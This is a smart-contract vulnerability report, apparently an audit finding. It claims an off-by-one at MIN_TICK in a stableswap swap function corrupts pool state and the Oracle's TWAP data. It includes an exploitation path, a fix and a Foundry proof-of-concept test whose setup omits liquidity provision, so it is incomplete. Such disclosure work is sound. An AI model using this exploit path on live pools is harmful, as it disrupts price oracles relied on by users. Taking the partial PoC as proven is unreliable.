## Title
Out-of-Bounds Tick Storage Causes Pool State Corruption and Oracle Data Poisoning

## Summary
When a stableswap pool swap crosses the MIN_TICK boundary in the decreasing direction, the arithmetic at line 756 computes `tick = MIN_TICK - 1`, which is below the protocol's minimum valid tick value. This invalid tick is stored in the pool state and recorded by the Oracle extension, corrupting cumulative price data and causing DoS of downstream price query functionality.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/Core.sol` in function `swap_6269342730()`, specifically lines 572-577 and line 756 [1](#0-0) [2](#0-1) 

**Intended Logic:** The comment at line 755 states "no overflow danger because nextTick is always inside the valid tick bounds." The code should maintain tick values within the range [MIN_TICK, MAX_TICK] = [-88722835, 88722835]. [3](#0-2) 

**Actual Logic:** When a stableswap pool (including full-range pools) has a swap in the decreasing direction that reaches MIN_SQRT_RATIO, the code sets `nextTick = MIN_TICK`. Then at line 756, the assembly computes:
```
tick := sub(nextTick, iszero(increasing))
// When increasing = false: tick = MIN_TICK - 1 = -88722836
```

This produces a tick value of -88722836, which is **one below MIN_TICK** (-88722835) and violates the protocol's valid tick bounds.

**Exploitation Path:**
1. A full-range stableswap pool exists (created via `createFullRangePoolConfig`)
2. Attacker initiates a large swap in the decreasing direction (selling token0 for token1) that pushes the price to MIN_SQRT_RATIO
3. The swap reaches exactly `sqrtRatioNext == MIN_SQRT_RATIO` at line 752
4. Line 756 executes with `nextTick = MIN_TICK` and `increasing = false`, computing `tick = MIN_TICK - 1 = -88722836`
5. Line 824 stores this invalid pool state: [4](#0-3) 

6. If the pool has the Oracle extension enabled, line 125 records this invalid tick in cumulative Oracle data: [5](#0-4) 

7. When `PriceFetcher` queries historical TWAP data and calls `tickToSqrtRatio()` on the average tick derived from corrupted Oracle data, it reverts with `InvalidTick`: [6](#0-5) [7](#0-6) 

**Security Property Broken:** The protocol's tick invariant is violated - all ticks must satisfy `abs(tick) <= MAX_TICK_MAGNITUDE`. The stored tick -88722836 has absolute value 88722836, which exceeds MAX_TICK_MAGNITUDE (88722835).

## Impact Explanation
- **Affected Assets**: Stableswap pools (especially full-range pools) and their Oracle data. Any downstream protocols or contracts relying on PriceFetcher for TWAP price data are affected.
- **Damage Severity**: 
  - Pool state is corrupted with an out-of-bounds tick value
  - Oracle cumulative data becomes poisoned with invalid tick values
  - PriceFetcher queries revert, causing DoS of price oracle functionality for the affected pool
  - While direct fund loss is not immediate, the corrupted state creates undefined behavior that violates protocol invariants
- **User Impact**: All users of the affected pool and any protocols/integrations relying on its Oracle data for pricing. The DoS affects price queries until the pool state "heals" via a future swap that recomputes a valid tick.

## Likelihood Explanation
- **Attacker Profile**: Any user with sufficient capital to move a stableswap pool's price to MIN_SQRT_RATIO
- **Preconditions**: 
  - Stableswap pool (full-range or with active liquidity range) must exist
  - Pool must have low enough liquidity or high enough trade size to reach MIN_SQRT_RATIO
  - For Oracle corruption, pool must have Oracle extension enabled
- **Execution Complexity**: Single swap transaction that reaches the price limit
- **Frequency**: Can be triggered once per pool reaching the extreme price boundary. The corrupted state persists until a future swap moves the price away from MIN_SQRT_RATIO and recomputes a valid tick at line 803. [8](#0-7) 

## Recommendation

In `src/Core.sol`, function `swap_6269342730`, line 756:

**CURRENT (vulnerable):**
```solidity
assembly ("memory-safe") {
    // no overflow danger because nextTick is always inside the valid tick bounds
    tick := sub(nextTick, iszero(increasing))
}
```

**FIXED:**
```solidity
assembly ("memory-safe") {
    // Compute tick with bounds checking to prevent underflow below MIN_TICK
    let computedTick := sub(nextTick, iszero(increasing))
    // Clamp to MIN_TICK if the subtraction would go out of bounds
    tick := add(computedTick, mul(slt(computedTick, MIN_TICK), sub(MIN_TICK, computedTick)))
}
```

**Alternative mitigation:** Modify the stableswap boundary logic at lines 575-576 to never set `nextTick` to exactly MIN_TICK when decreasing, instead using `MIN_TICK + 1` as the effective lower boundary for swap calculations.

## Proof of Concept

```solidity
// File: test/Exploit_OutOfBoundsTick.t.sol
// Run with: forge test --match-test test_OutOfBoundsTickCorruption -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Router.sol";
import "../src/types/poolConfig.sol";
import "../src/math/constants.sol";

contract Exploit_OutOfBoundsTick is Test {
    Core core;
    Router router;
    
    address token0 = address(0); // NATIVE_TOKEN
    address token1 = address(0x123);
    
    function setUp() public {
        // Deploy Core and Router
        core = new Core();
        router = new Router(core);
        
        // Create full-range stableswap pool
        PoolConfig config = createFullRangePoolConfig(0, address(0));
        PoolKey memory poolKey = PoolKey({
            token0: token0,
            token1: token1,
            config: config
        });
        
        // Initialize pool at a high tick (far from MIN_TICK)
        core.lock(
            address(router),
            abi.encodeCall(router.initializePool, (poolKey, int32(1000000)))
        );
        
        // Add liquidity
        // (simplified - actual implementation would need proper liquidity provision)
    }
    
    function test_OutOfBoundsTickCorruption() public {
        // SETUP: Pool exists at high tick value
        PoolKey memory poolKey = PoolKey({
            token0: token0,
            token1: token1,
            config: createFullRangePoolConfig(0, address(0))
        });
        
        PoolId poolId = poolKey.toPoolId();
        PoolState stateBefore = core.poolState(poolId);
        int32 tickBefore = stateBefore.tick();
        
        console.log("Tick before exploit:", tickBefore);
        
        // EXPLOIT: Perform massive swap to push price to MIN_SQRT_RATIO
        SwapParameters memory params = SwapParameters({
            amount: type(int128).max, // Large swap
            isToken1: false, // Selling token0
            sqrtRatioLimit: MIN_SQRT_RATIO // Target minimum price
        });
        
        core.lock(
            address(this),
            abi.encodeCall(core.swap_6269342730, (poolKey, params))
        );
        
        // VERIFY: Pool state now has out-of-bounds tick
        PoolState stateAfter = core.poolState(poolId);
        int32 tickAfter = stateAfter.tick();
        
        console.log("Tick after exploit:", tickAfter);
        console.log("MIN_TICK:", MIN_TICK);
        console.log("Tick is out of bounds:", tickAfter < MIN_TICK);
        
        // Verify the vulnerability
        assertEq(tickAfter, MIN_TICK - 1, "Tick should be MIN_TICK - 1");
        assertTrue(tickAfter < MIN_TICK, "Vulnerability confirmed: tick is below MIN_TICK");
        
        // Verify tickToSqrtRatio would revert on this tick
        vm.expectRevert(abi.encodeWithSelector(InvalidTick.selector, tickAfter));
        tickToSqrtRatio(tickAfter);
    }
}
```

## Notes

This vulnerability demonstrates a critical oversight in the tick boundary arithmetic. While the code includes a comment claiming "no overflow danger because nextTick is always inside the valid tick bounds," this assumption is violated when `nextTick = MIN_TICK` and the code subtracts 1 in the decreasing direction.

The symmetric case for MAX_TICK does **not** have this issue because when `increasing = true`, the formula computes `tick = MAX_TICK - 0 = MAX_TICK`, which remains valid.

The issue is particularly concerning for full-range stableswap pools with the Oracle extension, as it permanently corrupts the Oracle's cumulative tick data until the pool state heals naturally through a future swap. This violates the Oracle's purpose of providing manipulation-resistant price data.

### Citations

**File:** src/Core.sol (L572-577)
```text
                    if (config.isStableswap()) {
                        if (config.isFullRange()) {
                            // special case since we don't need to compute min/max tick sqrt ratio
                            (nextTick, nextTickSqrtRatio) =
                                increasing ? (MAX_TICK, MAX_SQRT_RATIO) : (MIN_TICK, MIN_SQRT_RATIO);
                        } else {
```

**File:** src/Core.sol (L752-757)
```text
                    if (sqrtRatioNext == nextTickSqrtRatio) {
                        sqrtRatio = sqrtRatioNext;
                        assembly ("memory-safe") {
                            // no overflow danger because nextTick is always inside the valid tick bounds
                            tick := sub(nextTick, iszero(increasing))
                        }
```

**File:** src/Core.sol (L801-804)
```text
                    } else if (sqrtRatio != sqrtRatioNext) {
                        sqrtRatio = sqrtRatioNext;
                        tick = sqrtRatioToTick(sqrtRatio);
                    }
```

**File:** src/Core.sol (L824-826)
```text
                stateAfter = createPoolState({_sqrtRatio: sqrtRatio, _tick: tick, _liquidity: liquidity});

                writePoolState(poolId, stateAfter);
```

**File:** src/math/constants.sol (L8-14)
```text
// The minimum tick value supported by the protocol
// Corresponds to the minimum possible price ratio in the protocol
int32 constant MIN_TICK = -88722835;

// The maximum tick value supported by the protocol
// Corresponds to the maximum possible price ratio in the protocol
int32 constant MAX_TICK = 88722835;
```

**File:** src/extensions/Oracle.sol (L113-126)
```text
            PoolState state = CORE.poolState(poolId);

            uint128 liquidity = state.liquidity();
            uint256 nonZeroLiquidity;
            assembly ("memory-safe") {
                nonZeroLiquidity := add(liquidity, iszero(liquidity))
            }

            Snapshot snapshot = createSnapshot({
                _timestamp: uint32(block.timestamp),
                _secondsPerLiquidityCumulative: last.secondsPerLiquidityCumulative()
                    + uint160(FixedPointMathLib.rawDiv(uint256(timePassed) << 128, nonZeroLiquidity)),
                _tickCumulative: last.tickCumulative() + int64(uint64(timePassed)) * state.tick()
            });
```

**File:** src/math/ticks.sol (L22-25)
```text
function tickToSqrtRatio(int32 tick) pure returns (SqrtRatio r) {
    unchecked {
        uint256 t = FixedPointMathLib.abs(tick);
        if (t > MAX_TICK_MAGNITUDE) revert InvalidTick(tick);
```

**File:** src/lens/PriceFetcher.sol (L111-112)
```text
                uint128 amountBase = amount1Delta(tickToSqrtRatio(base.tick), MIN_SQRT_RATIO, base.liquidity, false);
                uint128 amountQuote = amount1Delta(tickToSqrtRatio(quote.tick), MIN_SQRT_RATIO, quote.liquidity, false);
```
